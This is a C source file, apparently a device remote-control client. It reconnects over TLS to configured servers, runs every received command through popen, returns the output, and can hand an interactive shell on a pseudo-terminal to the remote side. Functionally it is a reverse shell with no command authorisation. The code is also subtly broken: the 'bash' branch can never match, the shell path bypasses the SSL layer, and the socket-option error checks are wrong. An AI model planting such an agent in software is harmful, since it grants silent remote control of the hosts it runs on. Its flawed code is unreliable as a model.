/*
 * ============================================================================
 *
 *       Filename:  rctl.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  2014年09月28日 11时02分55秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  jianxi sun (jianxi), ycsunjane@gmail.com
 *   Organization:  
 *
 * ============================================================================
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <signal.h>

#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <netinet/tcp.h>
#include <netdb.h>

#include "common.h"
#include "rctl.h"
#include "log.h"
#include "ssltcp.h"

int debug = 1;
static char cmd[CMDLEN];
static char buf[BUFLEN];

static in_addr_t r_server(int num)
{
	struct hostent *host;
	host = gethostbyname(serverip[num]);
	if(host != NULL && host->h_length > 0) {
		sys_debug("Try connect: %s\n", serverip[num]);
		return *(in_addr_t *)host->h_addr_list[0];
	}
	fprintf(stderr, "Can not get: %s\n", serverip[num]);
	return 0;
}

static int tcp_alive(int sock)
{
	int optval = 1;
	int optlen = sizeof(optval);
	if(setsockopt(sock, SOL_SOCKET, 
			SO_KEEPALIVE, &optval, optlen) < -1) {
		sys_err("Set tcp keepalive failed: %s\n",
			strerror(errno));
		return 0;
	}

	optval = 5;
	if(setsockopt(sock, SOL_TCP,
			TCP_KEEPCNT, &optval, optlen) < -1) {
		sys_err("Set tcp_keepalive_probes failed: %s\n",
			strerror(errno));
		return 0;
	}

	optval = 30;
	if(setsockopt(sock, SOL_TCP, 
			TCP_KEEPIDLE, &optval, optlen) < -1) {
		sys_err("Set tcp_keepalive_time failed: %s\n",
			strerror(errno));
		return 0;
	}

	optval = 30;
	if(setsockopt(sock, SOL_TCP, 
			TCP_KEEPINTVL, &optval, optlen) < -1) {
		sys_err("Set tcp_keepalive_intvl failed: %s\n",
			strerror(errno));
		return 0;
	}

	return 1;
}

static int r_connect()
{
	static int count = 0;
	sys_debug("Trying %d ......\n", count++);
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd < 0) {
		sys_err("Create socket failed: %s(%d)\n", 
			strerror(errno), errno);
		return -1;
	}

	struct sockaddr_in addr;

	int i, j;
	in_addr_t server;

	for(i = 0; i < TOTSER; i++) {
		socklen_t addr_len = sizeof(addr);
		addr.sin_family = AF_INET;
		server = r_server(i);
		if(!server) continue;
		addr.sin_addr.s_addr = server;

		for(j = 0; j < TOTPRT; j++) {
			addr.sin_port = htons(port[j]);
			sys_debug("Try %s port: %d\n", 
				inet_ntoa(addr.sin_addr), port[j]);

			if(!connect(fd, (void *)&addr, addr_len) && 
				tcp_alive(fd)) {
				sys_debug("connect success\n");
				return fd;
			}
			sys_debug("connect failed\n");
		}
	}
	return -1;
}

static char *pty_init(int *pptm)
{
	int ptm = posix_openpt(O_RDWR);
	if(ptm < 0) {
		sys_err("posix_openpt failed: %s(%d\n)", 
			strerror(errno), errno);
		exit(-1);
	}

	if(grantpt(ptm) < 0) {
		sys_err("grantpt failed: %s(%d\n)", 
			strerror(errno), errno);
		exit(-1);
	}

	if(unlockpt(ptm) < 0){
		sys_err("unlockpt failed: %s(%d\n)", 
			strerror(errno), errno);
		exit(-1);
	}

	char *name = ptsname(ptm);
	if(!name) {
		sys_err("ptsname failed: %s(%d\n)", 
			strerror(errno), errno);
		exit(-1);
	}

	*pptm = ptm;

	return name;
}

static void term(int signum)
{
	sys_debug("SIGCHLD received\n");
	int status;
	pid_t pid = waitpid((pid_t)-1, &status, WNOHANG);
	sys_debug("child process %ld exited: %d",
		(long) pid, WEXITSTATUS(status));
	exit(0);
}

static void bash(int fd)
{
	pid_t pid;
	if( (pid = fork()) < 0) {
		sys_err("Fork failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	} else if(pid) {
		/* parent will wait until child exit */
		wait(NULL);
	}

	/* child */
	int ptm;
	char *ptsname = pty_init(&ptm);

	if( (pid = fork()) < 0) {
		sys_err("Fork failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	} else if(pid == 0) {
		/* child */
		int pts = open(ptsname, O_RDWR);
		if(pts < 0) {
			sys_err("open %s failed: %s(%d)\n", 
				ptsname, strerror(errno), errno);
			exit(-1);
		}

		dup2(pts, 0);
		dup2(pts, 1);
		dup2(pts, 2);
		if(execlp("sh", "sh", "-i", NULL) < 0) {
			sys_err("Execlp failed: %s(%d)\n", 
				strerror(errno), errno);
			exit(-1);
		}
	} else {
		/* SIGCHLD check bash exit */
		struct sigaction act;
		memset(&act, 0, sizeof(act));
		act.sa_handler = term;
		sigaction(SIGCHLD, &act, NULL);

		/* parent */
		int maxfd = (ptm > fd) ? (ptm + 1) : (fd + 1);
		fd_set fset, bset;
		FD_ZERO(&fset);
		FD_SET(fd, &fset);
		FD_SET(ptm, &fset);
		bset = fset;

		int count;
		ssize_t nrcv;
		while(1) {
			fset = bset;
			count = Select(maxfd, &fset, NULL, NULL, NULL);
			if(count < 0) {
				sys_err("Select failed: %s(%d)\n",
					strerror(errno), errno);
				exit(-1);
			}

			if(FD_ISSET(fd, &fset)) {
				nrcv = Recv(fd, buf, BUFLEN, 0);
				if(nrcv <= 0) {
					sys_debug("Connection closed: %s(%d)",
						strerror(errno), errno);
					exit(-1);
				}

				if(Send(ptm, buf, nrcv, 0) < 0) {
					sys_debug("pty closed: %s(%d)",
						strerror(errno), errno);
					exit(-1);
				}
			}

			if(FD_ISSET(ptm, &fset)) {
				nrcv = Recv(ptm, buf, BUFLEN, 0);
				if(nrcv <= 0) {
					sys_debug("pty closed: %s(%d)",
						strerror(errno), errno);
					exit(-1);
				}

				if(Send(fd, buf, nrcv, 0) < 0) {
					sys_debug("Connection closed: %s(%d)",
						strerror(errno), errno);
					exit(-1);
				}
			}
		}
	}
}

static void ssl_free(SSL *ssl)
{
	ssltcp_shutdown(ssl);
	ssltcp_free(ssl);
}

void rctl(char *devid)
{
	pid_t pid;
	if( (pid = fork()) < 0) {
		sys_err("Fork failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	} else if(pid) {
		/* parent */
		return;
	}

	/* child */
	ssltcp_init(0);

	int fd = 0;
reconnect:
	close(fd);
	fd = r_connect();
	if(fd == -1) goto reconnect;

	SSL *ssl = ssltcp_ssl(fd);
	if(!ssl) goto reconnect;

	if(ssltcp_connect(ssl) < 0) {
		ssltcp_free(ssl);
		goto reconnect;
	}

	int ret;
	ret = ssltcp_write(ssl, devid, strlen(devid));
	if(ret <= 0) {
		ssl_free(ssl);
		goto reconnect;
	}
	sys_debug("Send class: %s\n", devid);

	while(1) {
		/* max command len should less than
		 * CMDLEN, so ret always complete */
		ret = ssltcp_read(ssl, cmd, CMDLEN);
		if(ret <= 0) {
			ssl_free(ssl);
			goto reconnect;
		}
		cmd[ret] = 0;
		sys_debug("recv command: %s\n", cmd);

		strncat(cmd, " 2>&1", CMDLEN - strlen(cmd));
		if(!strcmp(cmd, "bash")) {
			sys_debug("Exec: %s\n", cmd);
			/* parent process will block 
			 * util child exit */
			bash(fd);
			continue;
		}

		FILE *fp; int size;
		fp = popen(cmd, "r"); 
		if(!fp) {
			sprintf(buf, "exec fail: %s\n", cmd);
			ret = ssltcp_write(ssl, buf, strlen(buf));
			if(ret <= 0) {
				ssl_free(ssl);
				goto reconnect;
			}
		} else {
			int isfirst = 1;
			do {
				size = fread(buf, 1, CMDLEN, fp);
				/* some command have no output */
				if(isfirst && size == 0) {
					sprintf(buf, "exec success: %s\n", cmd);
					ret = ssltcp_write(ssl, buf, strlen(buf));
					if(ret <= 0) {
						ssl_free(ssl);
						pclose(fp);
						goto reconnect;
					}
				}

				isfirst = 0;
				if(size > 0) {
					ret = ssltcp_write(ssl, buf, size);
					if(ret <= 0) {
						ssl_free(ssl);
						pclose(fp);
						goto reconnect;
					}
				}
			} while(size == BUFLEN);
			pclose(fp);
		}
	}
}
